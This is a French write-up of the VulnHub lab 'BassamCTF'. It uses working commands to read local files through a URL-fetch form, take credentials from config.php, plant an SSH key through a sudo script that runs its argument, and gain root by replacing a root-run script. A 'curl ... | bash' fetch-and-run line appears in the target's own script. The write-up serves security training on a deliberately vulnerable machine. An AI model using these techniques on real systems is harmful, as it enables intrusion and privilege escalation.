---
title: Solution du CTF BassamCTF de VulnHub
tags: [CTF, VulnHub]
---

### En tête

[bassamCTF](https://vulnhub.com/entry/bassamctf-1,631/) est un CTF disponible sur VulnHub. Il y a quelques étapes qui sortent de l'exploitation pure et dure mais le chemin à suivre est plutôt explicite.

On y trouve les services habituels. Vu l'age du CTF ce n'est pas étonnant d'avoir autant de CVEs :

```console
$ sudo nmap -sCV --script vuln -T5 -p- 192.168.242.140
Starting Nmap 7.95 ( https://nmap.org )
Nmap scan report for 192.168.242.140
Host is up (0.00050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.6p1: 
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A    10.0    https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
--- snip ---
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT*
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.29: 
|       C94CBDE1-4CC5-5C06-9D18-23CAB216705E    10.0    https://vulners.com/githubexploit/C94CBDE1-4CC5-5C06-9D18-23CAB216705E  *EXPLOIT*
|       95499236-C9FE-56A6-9D7D-E943A24B633A    10.0    https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A  *EXPLOIT*
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A  *EXPLOIT*
|       PACKETSTORM:181114      9.8     https://vulners.com/packetstorm/PACKETSTORM:181114      *EXPLOIT*
|       MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-       9.8     https://vulners.com/metasploit/MSF:EXPLOIT-MULTI-HTTP-APACHE_NORMALIZE_PATH_RCE-        *EXPLOIT*
--- snip ---
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
|       PACKETSTORM:164501      0.0     https://vulners.com/packetstorm/PACKETSTORM:164501      *EXPLOIT*
|       PACKETSTORM:164418      0.0     https://vulners.com/packetstorm/PACKETSTORM:164418      *EXPLOIT*
|       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
|_      05403438-4985-5E78-A702-784E03F724D4    0.0     https://vulners.com/githubexploit/05403438-4985-5E78-A702-784E03F724D4  *EXPLOIT*
MAC Address: 00:0C:29:04:4B:94 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.34 seconds
```

La page d'index est vide... à première vue. On trouve un commentaire HTML :

```html
<!-- bassam.ctf --> 
```

Une ligne dans `/etc/hosts` plus tard, on se rend à l'adresse indiquée et on a seulement ce message : `welcome to my blog`.

Sur un scénario avec un nom d'hôte custom, il y a de fortes chances pour que des sous-domaines soient présents. Il suffit de changer l'entête `Host` dans les requêtes HTTP pour tester :

```console
$ $ ffuf -u http://bassam.ctf/ -H "Host: FUZZ.bassam.ctf" -w fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt -fs 21

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://bassam.ctf/
 :: Wordlist         : FUZZ: fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt
 :: Header           : Host: FUZZ.bassam.ctf
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 21
________________________________________________

welcome                 [Status: 200, Size: 38, Words: 4, Lines: 4, Duration: 20ms]
:: Progress: [50000/50000] :: Job [1/1] :: 1265 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```

Sur ce dernier, toujours une page vide et un commentaire :

```html
<!--open your eyes -->
```

En énumérant les fichiers ici, on trouve un `index.php` dissimulé derrière le `index.html`.

```console
$ feroxbuster -u http://welcome.bassam.ctf/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://welcome.bassam.ctf/
 🚀  Threads               │ 50
 📖  Wordlist              │ fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        3l        6w       38c http://welcome.bassam.ctf/index.html
200        0l        0w        0c http://welcome.bassam.ctf/config.php
200       12l       17w      229c http://welcome.bassam.ctf/index.php
403        9l       28w      283c http://welcome.bassam.ctf/.htaccess
200        3l        6w       38c http://welcome.bassam.ctf/
403        9l       28w      283c http://welcome.bassam.ctf/.html
403        9l       28w      283c http://welcome.bassam.ctf/.php
403        9l       28w      283c http://welcome.bassam.ctf/.htpasswd
403        9l       28w      283c http://welcome.bassam.ctf/.htm
403        9l       28w      283c http://welcome.bassam.ctf/.htpasswds
403        9l       28w      283c http://welcome.bassam.ctf/.htgroup
403        9l       28w      283c http://welcome.bassam.ctf/wp-forum.phps
403        9l       28w      283c http://welcome.bassam.ctf/.htaccess.bak
403        9l       28w      283c http://welcome.bassam.ctf/.htuser
403        9l       28w      283c http://welcome.bassam.ctf/.htc
403        9l       28w      283c http://welcome.bassam.ctf/.ht
403        9l       28w      283c http://welcome.bassam.ctf/.htaccess.old
403        9l       28w      283c http://welcome.bassam.ctf/.htacess
[####################] - 6s     37034/37034   0s      found:18      errors:0      
[####################] - 5s     37034/37034   6565/s  http://welcome.bassam.ctf/
```

### scheme://

Le code HTML retourne un formulaire ainsi qu'une référence à un répo Github. Ce dernier n'existe pas (ou plus) :

```console
$ curl -s http://welcome.bassam.ctf/index.php 

<html>
<body>

<form action="" method="post">
url <input type=text name=url placeholder="image_url...">
<input type=submit value="download">
<!--https://github.com/kira2040k/MYCTF/blob/main/index.php-->
</form>

</body>
</html>
```

J'ai testé le chargement de fichiers locaux avec le scheme `file://` et ça a marché :

```console
$ curl -s http://welcome.bassam.ctf/index.php -X POST --data "url=file:///etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
kira:x:1000:1000:kira:/home/kira:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
bassam:x:1001:1001::/home/bassam:/bin/sh
test:x:1002:1002::/home/test:/bin/sh
```

Durant l'énumération, on a aussi croisé un fichier `config.php`. Ce dernier contient des identifiants :

```console
$ curl -s http://welcome.bassam.ctf/index.php -X POST --data "url=config.php"
<?php
$user='test';
$pass='test123';
?>
```

### Michel Blanc

Les identifiants en question permettent un accès sur SSH. L'historique bash mentionne un fichier nommé `MySecretPassword` que l'on retrouve sous la racine web :

```console
$ id
uid=1002(test) gid=1002(test) groups=1002(test)
$ ls -al
total 32
drwxr-xr-x 4 test test 4096 Dec 13  2020 .
drwxr-xr-x 5 root root 4096 Dec 13  2020 ..
-rw------- 1 test test   34 Dec 13  2020 .bash_history
-rw-r--r-- 1 test test  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 test test 3771 Apr  4  2018 .bashrc
drwx------ 2 test test 4096 Dec 13  2020 .cache
drwx------ 3 test test 4096 Dec 13  2020 .gnupg
-rw-r--r-- 1 test test  807 Apr  4  2018 .profile
$ cat .bash_history
ls
cat MySecretPassword 
clear
ls
$ sudo -l
[sudo] password for test: 
Sorry, user test may not run sudo on kira.
$ find / -name MySecretPassword 2> /dev/null    
/var/www/ctf/MySecretPassword
$ cat /var/www/ctf/MySecretPassword
                                                                                                           
                                                                                                         
                                                                                                                  
                                                                                                 
                                                  
                                                
                                                
                                                   
$
```

Ce fichier semble rempli d'espaces et de retours à la ligne, mais le nombre d'espaces sur chaque ligne change, ce qui est énigmatique.

J'ai fait ce script pour compter les espaces sur chaque ligne :

```python
with open("/var/www/ctf/MySecretPassword") as fd:
    for line in fd:
        print(line.count(" "))
```

Soit :

```
107
105
114
97
50
48
48
51
```

Ça ressemble clairement à des valeurs ordinales de caractères ASCII. Je modifie mon script en conséquence :

```python
with open("/var/www/ctf/MySecretPassword") as fd:
    for line in fd:
        print(chr(line.count(" ")), end="")
    print("")
```

Bingo :

```console
$ python3 /tmp/count.py 
kira2003
```

### Bâche

Le mot de passe correspond au compte `kira`. Une permission sudo permet d'exécuter un script sous notre contrôle avec les droits de l'utilisateur `bassam` :

```console
kira@kira:~$ id
uid=1000(kira) gid=1000(kira) groups=1000(kira),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
kira@kira:~$ ls -al
total 40
drwxr-xr-x 5 kira kira 4096 Dec 13  2020 .
drwxr-xr-x 5 root root 4096 Dec 13  2020 ..
-rw------- 1 kira kira  162 Dec 13  2020 .bash_history
-rw-r--r-- 1 kira kira  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 kira kira 3771 Apr  4  2018 .bashrc
drwx------ 2 kira kira 4096 Dec 13  2020 .cache
drwx------ 3 kira kira 4096 Dec 13  2020 .gnupg
drwxrwxr-x 3 kira kira 4096 Dec 13  2020 .local
-rw-r--r-- 1 kira kira  807 Apr  4  2018 .profile
-rw-r--r-- 1 kira kira    0 Dec 13  2020 .sudo_as_admin_successful
-rwxr-xr-x 1 root root   78 Dec 13  2020 test.sh
kira@kira:~$ cat test.sh 
echo 'your name'
read name
echo  $name >/home/kali/message.txt
$1 2>/dev/null
kira@kira:~$ sudo -l
[sudo] password for kira: 
Matching Defaults entries for kira on kira:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kira may run the following commands on kira:
    (bassam) /home/kira/test.sh
```

Le script prend un paramètre (`$1`) et l'exécute. On va en profiter :

```console
kira@kira:~$ vi /tmp/key_no_pass.pub
kira@kira:~$ echo -e '#!/bin/bash\nmkdir -p /home/bassam/.ssh;cat /tmp/key_no_pass.pub >> /home/bassam/.ssh/authorized_keys' > /tmp/script.sh
kira@kira:~$ chmod 755 /tmp/script.sh 
kira@kira:~$ sudo -u bassam /home/kira/test.sh /tmp/script.sh
your name
yolo
/home/kira/test.sh: 3: /home/kira/test.sh: cannot create /home/kali/message.txt: Directory nonexistent
```

Malgré l'erreur ça a fonctionné.

### Linux 101

Une fois le shell de `bassam` récupéré, on doit passer par une autre entrée `sudoers` :

```console
$ id
uid=1001(bassam) gid=1001(bassam) groups=1001(bassam)
$ sudo -l
Matching Defaults entries for bassam on kira:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bassam may run the following commands on kira:
    (root) NOPASSWD: /home/bassam/down.sh
$ cat /home/bassam/down.sh
curl "http://mywebsite.test/script.sh" |bash 

$ ls -al /home/bassam/down.sh
-rwxr-xr-x 1 root root 47 Dec 13  2020 /home/bassam/down.sh
$ find /etc -type f -writable 2> /dev/null
/etc/hosts


```

Clairement l'objectif attendu est de modifier `/etc/hosts` pour rajouter une entrée pour `mywebsite.test` mais j'ai la flemme.

Le fichier `down.sh` appartient à root, mais comme il est dans un dossier dont nous sommes propriétaire, on peut le déplacer et mettre un script à nous à la place :

```console
$ mv down.sh yolo
$ echo -e '#!/bin/bash\nbash' > down.sh
$ cp /bin/bash down.sh
$ sudo /home/bassam/down.sh
root@kira:~# id
uid=0(root) gid=0(root) groups=0(root)
root@kira:~# cd /root
root@kira:/root# ls
Encoder
```

Il n'y a pas de flags mais on trouve le code source du fichier remplit d'espaces :

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char **argv) {
    if (argc != 3) {
        printf("Usage %s <text to encode> <file>\xA", argv[0]);
        exit(1);
    }
    char *string = argv[1];
    int i, j, length = strlen(argv[1]);
    FILE *toFile = fopen(argv[2], "w");
    for (i = 0; i < length; i++) {
        char currentChar = string[i];
        for (j = 0; j < (int)currentChar; j++){ 
            fprintf(toFile, "\x20");
        }
        fprintf(toFile, "\xA");
    }
}
```

L'auteur ne connaissait visiblement pas le mécanisme des permissions Linux, car cette particularité permet de passer outre les deux escalades de privilèges présentes.
